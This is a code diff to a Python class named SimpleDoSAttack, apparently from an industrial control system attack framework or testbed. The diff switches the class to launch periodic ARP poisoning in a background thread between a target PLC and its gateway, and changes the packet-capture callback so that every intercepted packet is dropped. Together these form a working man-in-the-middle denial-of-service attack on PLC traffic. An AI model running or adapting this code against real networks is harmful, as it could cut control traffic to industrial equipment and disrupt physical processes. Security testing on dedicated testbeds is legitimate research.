@@ -45,7 +45,6 @@ class SimpleDoSAttack(SyncedAttack):
         os.system('sysctl net.ipv4.ip_forward=1')
         self.thread = None
         self.server = None
-        self.run_thread = False
         self.tags = {}
         self.dict_lock = threading.Lock()
 
@@ -68,13 +67,14 @@ class SimpleDoSAttack(SyncedAttack):
         self.logger.info(f"NFqueue Bound periodic ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        self.launch_mitm()
-        #self.run_thread = True
-        # Are we returning from this? No, we are not
-        #_thread.start_new_thread(self.launch_periodic_poison, (self.ARP_POISON_PERIOD, 0))
+        #self.launch_periodic_poison(self.ARP_POISON_PERIOD, 0)
+
         #self.launch_mitm()
-        #self.logger.info(f"Configured periodic ARP Poison between {self.target_plc_ip} and "
-        #                  f"{self.intermediate_attack['gateway_ip']}")
+        self.run_thread = True
+        _thread.start_new_thread(self.launch_periodic_poison, (self.ARP_POISON_PERIOD, 0))
+        #self.launch_mitm()
+        self.logger.info(f"Configured periodic ARP Poison between {self.target_plc_ip} and "
+                         f"{self.intermediate_attack['gateway_ip']}")
 
     def launch_periodic_poison(self, period, delay):
         while self.run_thread:
@@ -93,11 +93,7 @@ class SimpleDoSAttack(SyncedAttack):
                           f"{self.intermediate_attack['gateway_ip']}")
 
     def capture(self, packet):
-        parsed_packet = IP(packet.get_payload())
-        if len(parsed_packet) != 102:
-            packet.accept()
-        else:
-            packet.drop()
+        packet.drop()
 
     def teardown(self):
         self.run_thread = False
